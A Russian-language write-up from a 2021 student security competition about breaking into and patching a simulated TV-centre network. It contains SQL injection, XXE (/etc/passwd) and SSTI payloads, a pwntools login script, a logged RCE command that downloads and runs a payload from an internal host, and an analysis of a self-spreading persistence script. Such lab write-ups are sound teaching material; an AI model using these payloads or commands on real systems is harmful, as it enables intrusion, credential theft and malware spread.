#  Инженерная задача по Информационной безопасности НТИ 2021 | Весёлая Ферма

## Задача

 Перед нами стоит задача: есть телецентр, который подвергся хакерской атаке, но у нас нет к нему доступа. Нам надо войти в систему и устранить уязвимости.
 
 
## Вход во внутреннюю сеть

### Начальное исследование

Сначала было произведено сканирование портов, найдены следующие:
```
PORT STATE SERVICE
80/tcp | open | http
81/tcp | open | 
5000/tcp | open |
8027/tcp | open|
51515/tcp | open |

```
```
 81 | HTTP | Хостит обфусцированный файл run.py
 5000 | HTTP | Веб-приложение, сайт провайдера (?) NetGen
 8037 | UDP? | Открыт, но не отвечает 
 51515 | TCP | Какой-то сервис, просит пароль
 ```
 
На сервисе NetGen есть страницы ```/register```, ```/login```, ```/logout``` Регистрируем пользователя, доступна функция создания тикетов. В параметре POST title обнаружена SSTI (предположительно, Jinja2) Некоторые ключевые слова фильтруются, причем необязательно в составе пейлоада (например, config)

Далее нами было получено SSTI RCE в сервисе на :5000
![kts](https://user-images.githubusercontent.com/67109334/110940347-cf5fa280-8347-11eb-917d-432bcbc26336.png)


###  Удаленное управление команд

#### Решение:

>Использовать whitelist вместо blacklist, разрешать только опции к команде uptime.
```
└─$ diff ../app/server.py server.py                                                           
224c224,226
&lt;     bad_words = ['whoami', 'id', 'python', 'php', 'bash'] #hacker shouldn't pass
---
&gt;     # Разрешить только опции к команде uptime: 
&gt;     good_words = ['-p', '--pretty', '-h', '--help', '-s', '--since', '-V', '--version']
&gt; 
227,228c229,230
&lt;         for i in bad_words:
&lt;             if i in req:
---
&gt;         for token in req.split():
&gt;             if token not in good_words:
229a232
```

* Создать пользователя " || "admin : passwd
* Войти как || "admin : admin <— слабая парольная политика!
* Перейти на /dialog?u=? -> слив диалога
* Если поменять " || "admin‘s passwd, то поменяется пароль самого админа
* Патч: использовать правильные методы к базе данных с экранированием, использовать экранирование

Улучшить парольные политики

### Взлом run.py на хосте :81

#### Сначала деобфусцируем скрипт:
>
- Упростим имена, переименуем все в более понятный вид
- Упростим hex-строки, получается encode, unhexlify и прочее
- Избавимся от непонятных вызовов locals(), getattr():
  - getattr(binascii, 'unhexlify')(...) 
  - binascii.unhexlify(...)
  - locals['somefunc'](..., ...) 
  - somefunc(..., ...)
- Последний шаг – избавимся от списков чисел. Можно заметить, что они используюстя только как аругмент к somefunc, при этом функция похожа на шифр Виженера. Для того, чтобы получить оригинальные строки, просто вызовем функцию с нужными аргументами. Выясняется, что большой список в начале файла – это зашифрованный приватный ключ RSA.

#### Алгоритм:

* Загрузить ключ RSA
* Получить hex-строку от пользователя
* Расшифровать строку
* Проверить соответствие с заданной строкой, если совпадают – вывести ~~флаг~~ важную информацию

#### Исследование:

>Приватный ключ дан почти в открытом виде, зашифруем с помощью него требуемую строку, затем подключимся к серверу на порту :51515, нас попросят ввести hex, отправим шифротекст, в ответ прилетит зашифрованная информация. С помощью скрипта и коюча ее расшифруем, получим сообщение с данными для входа во внутреннюю сеть

![kts](https://user-images.githubusercontent.com/67109334/110939654-cc17e700-8346-11eb-896b-367f495ac99b.png)

### SQLi №1

В ходе тестирования на проникновение, «Веселая ферма» смоделировала возможные действия злоумышленника на сайте телецентра “Sirius Game” и выявила возможность проведения атаки типа SQLi. Данная уязвимость даёт злоумышленнику возможность получения конфиденциальной информации пользователей, а именно переписок в личных диалогах.

Далее представлена некоторая техническая информация.

Для эксплуатации описанной выше уязвимости, необходимо послать GET запрос на страницу ```/dialog.``` В качестве уязвимого параметра используется ```‘u’```, в функционале сервиса он необходим для указания собеседника, переписку с которым необходимо загрузить.

Полезной нагрузкой в данном векторе атаки может быть ```" or "1" = "1" --```, однако не отрицаются другие варианты эксплуатирования данной уязвимости. Уязвимость расположена в функции ```get_dialog()``` и устраняется безопасной передачей аргументов в SQL-запрос:
```
└─$ diff server.py patched_sqli.py                                    
257c257
&lt;     c.execute('SELECT * FROM messages where to_user="' + username + '" and from_user="' + companion + '" or to_user="' + companion + '" and from_user="' + username + '"')                                                                    
---
&gt;     c.execute('SELECT * FROM messages where to_user=(?) and from_user=(?) or to_user=(?) and from_user=(?)', (username, companion, companion, username))
```

### :80 server

Это бинарь на Golang. Давайте попробуем подключитьс с помощью ```clientScript.py```. Этот сервер, кажется, не отвечает на наши ообщения, это означает, что нам надо зареверсить бинарь.

Давайте использовать IDA Free 7.0. The functions with the code start with main_:

#### Описание функции

```
main.main	init function. Starts the server
main.server	server func
main.listAllKeys	lists all keys in the redis db
main.RedisTestConnection	puts test:connection into db, then gets it
main.RedisCreateUsers	creates admin user entry in the db
main.checkForExistence	checks if the user already exists
main.createMd5Password	returns random md5 password string
main.asyncHandleConnections	handles connections
main.readAndEncode	utility function
```

![kts](https://user-images.githubusercontent.com/67109334/110940047-5a8c6880-8347-11eb-9145-a3bff40562fa.png)
in main.main os.Setenv is called with the arguments ("ADMIN_PASS", "de4ea1a59bb6df9d2f6ddc61cc28ce29"). 
Это, очевидно, пароль админа. Это переменное окружение в ```main.RedisCreateUsers```, который отправляет ```admin:ADMIN_PASS``` в ```redis db```.

Теперь мы можем понять, как взаимодействовать с сервером.

![kts](https://user-images.githubusercontent.com/67109334/110940183-8dcef780-8347-11eb-80f0-e22d9b207303.png)
main.asyncHandleConnections это большая функция, но если мы найдем строки, используемые в ней, которые: 

```
^/register [0-9A-Za-z]{3,8}
/showall
/login
/logout
/get_screen
```
Логика обнаружения для вычисления последних двух не такая уж простая, поэтому нам остается лишь делать выводы.
Давайте попробуем.

```
/login admin de4ea1a59bb6df9d2f6ddc61cc28ce29
/get_screen
```
Вывелась очень большая строка base64. Скопировать из терминала не получается, поэтому давайте автоматизируем процесс:

```
from pwn import remote

r = remote("195.19.98.103", 8037)
r.sendline("/login admin de4ea1a59bb6df9d2f6ddc61cc28ce29")
r.recv()
r.sendline("/get_screen")

data = r.recvuntil("==") # sadly no \n
from base64 import b64decode

with open("screeen.jpeg", "wb") as f:
    f.write(b64decode(data))
```

![kts](https://user-images.githubusercontent.com/67109334/110940251-a50de500-8347-11eb-8f00-64d13faa5db7.png)
После запуска скрипта, мы получаем инструкцию, как подключиться ко всей сети.


### SQLi №2

В ходе тестирования на проникновение «Веселая ферма» смоделировала возможные действия злоумышленника на сайте телецентра “Sirius Game” и выявила возможность проведения атаки типа SQLi. Данная уязвимость даёт злоумышленнику возможность смены пароля любого пользователя, в том числе администратора.

Далее представлена некоторая техническая информация.

Для эксплуатации описанной выше уязвимости, необходимо зарегистрировать аккаунт с логином ```[username]"--```, где username это логин атакуемого пользователя, например ```admin"--```. Следующим шагом, необходимо сменить пароль созданного пользователя воспользовавшись функционалом ```/change_passwd```. После выполнения этих шагов, злоумышленник получает доступ к аккаунту атакуемого пользователя и может войти в систему с данными ```[username]:[new password]```

Уязвимость расположена в функции ```change_user_passwd()``` и устраняется безопасной передачей аргументов в SQL-запрос:
```
└─$ diff server.py patched_sqli.py 
257c257
&lt;         c.execute('UPDATE staff set password=(?) where username="' + session[0] + '"', (password, ))                                                          
---
&gt;         c.execute('UPDATE staff set password=(?) where username=(?)', (password, session[0])) 
```

###  Доступ к приватной информации

Мы можем публиковать новости без авторизации.

```
@app.route("/import_news", methods=["GET", "POST"])
def import_news_route():
    try:
        username = get_user_info(request.cookies.get('session'))[1]
    except:
        return redirect("/login")
import news without auth
```
Пример пэйлоада:

```
POST /add_news HTTP/1.1
Host: 127.0.0.1:5000
Content-Length: 22
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:5000
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:5000/add_news
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

```title=123&content=3211```

Закрыл уязвимость добавлением проверки на авторизацию

```
@app.route("/add_news", methods=["GET", "POST"])
def add_news_route():
    try:
        session = 1 if get_user_info(request.cookies.get('session')) else 0
    except:
        session = 0
    if request.method == "POST":
        if get_user_info(request.cookies.get('session')):
            title = request.form.get('title')
            content = request.form.get('content')
            add_news(title, content)
        else: abort(403)
    return render_template('add_news.html', session=session)
```

## Патчи

### XML XXE

Используя такую нагрузку как ```<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>```, мы можем читать любой файл на сервере. Но это нельзя сделать через пользовательский интерфейс, поэтому нам придется делать прямой POST-запрос или добавить кнопку на страницу в нашем браузере.

Также мы можем создать скрипт, который автоматически скачивает файлы с сервера и выводит его в консоль.

Патч: изменить параметр в XMLParser.parse() в server.py, который закроет уязвимость

## Минорные патчи

### Скрытие паролей

Пароли в сервисе передавались в открытом виде, что не особо безопасно. Добавил хэширование ```sha256+salt``` в роутах ```/registration, /change_passwd, /login```:
```
└─$ diff server_without.py server.py
13a14
&gt; salt = 'penetration'
108c109
&lt;                 if check_user_password(request.form['login'], request.form['psw']):
---
&gt;                 if check_user_password(request.form['login'], hashlib.sha224((request.form['psw']+salt).encode()).hexdigest()):
136c137
&lt;                 change_user_passwd(request.cookies.get('session'), request.form['psw'])
---
&gt;                 change_user_passwd(request.cookies.get('session'), hashlib.sha224((request.form['psw']+salt).encode()).hexdigest())
319c320
&lt;     user = (data.get('login'), data.get('psw'), data.get('first_name'), data.get('second_name'), data.get('last_name'), data.get('position'))
---
&gt;     user = (data.get('login'), hashlib.sha224((data.get('psw')+salt).encode()).hexdigest(), data.get('first_name'), data.get('second_name'), data.get('last_name'), data.get('position'))
```

### Контроль доступа 

Неавторизированному пользователю не должна быть доступна служебная информация. Это может быть использовано для разведки и сбора информации о юзерах для дальнейшего вторжения. Добавил в начало функции ```staff_route``` проверку на авторизованность, для того чтобы скрыть информацию о пользователях от неавторизированных посетителей

```
@app.route("/staff", methods=["GET"])
def staff_route():
    try:
        username = get_user_info(request.cookies.get('session'))[1]
    except:
        return redirect("/login")
...
```

## Расследование атаки

### Вредонос

В ходе мониторинга веб-сервера были обнаружены следующие запросы:

```10.1.2.15 - - [12/Mar/2021 16:30:03] "GET /status?q=1;wget%20http%3A%2F%2F10.1.76.31%2Fupdate%20-O%20%2Ftmp%2Fupdate%20%26%26%20chmod%20%2Bx%20%2Ftmp%2Fupdate%20%26%26%20cd%20%2Ftmp%20%26%26%20.%2Fupdate%20%26%26%20rm%20%2Ftmp%2Fupdate HTTP/1.1" 200``` -
Это запрос к ```/status```, в которой ранее была обнаружена уязвимость RCE.

Скачаем файл. При открытии ничего не понятно, но на самом деле это достаточно простая обертка. Строки вида ```$@$@$@$@$@...``` на самом деле ничего не значат, но внутри них посимвольно записаны команды echo ```'...' | base64 -d | bash```. Получается, большая base64-строка – это собственно вредоносный скрипт.

Декодируем строку, получается скрипт. Заменим точки с запятой на переводы строк, получим немного более читаемый скрипт. Названия функций и переменных обфусцированны, также содержание строк зашифровано. Расшифруем строки, чтобы понять, что в них содерижтся – по сожержимому установим понятные названия для переменных. Шифрование простое: символы просто смещаются на 1 вперед ```(a -> b)```.

Можно заметить в строках две команды, которые скачивают из запускают еще файлы. ```doker-proxy``` – бинарный вредоносный файл, видимо связан с ```docker```, ```update``` – сам вредоносный скрипт.

Изучим две функции внизу.

Первая, как видно по достаточно читаемому коду, подключается по ssh к каждому из известных IP в ```~/.ssh/known_hosts``` и выполняет скрипт – значит, скрипт помимо вредоносных действий заражает известные компьютеры. Защититься можно, используя парольные фразы для приватных ключей – скрипт не сможет запросить ввод пароля от пользователя, а значит и воспользоваться ключами.

Далее скрипт скачивает файл ```doker-proxy``` и запускает его в фоновом режиме (анализ см. позже). Затем скрипт добавляет в cron правило, по которому он будет скачитваться и запускаться с некоторой периодичностью (чтобы после удаления скрипт снова попал в систему).

Если скрипт запускается с правами суперпользователя, удаляются все учетные записи, имеющие распространённые навзания (например, www). Затем с помощью скриптов на **pastebin.com** добавляются два пользователя с домашней папкой ```/root``` и определенной записью в ```/etc/shadow```.

Затем скрипт удаляет оставшиеся файлы и завершает работу.

#### Исправление

>Уязвимость, позволявшая загрузить и выполнить скрипт была закрыта. Теперь остаётся удалить правило в ```cron``` и остановить вредоносные процессы.
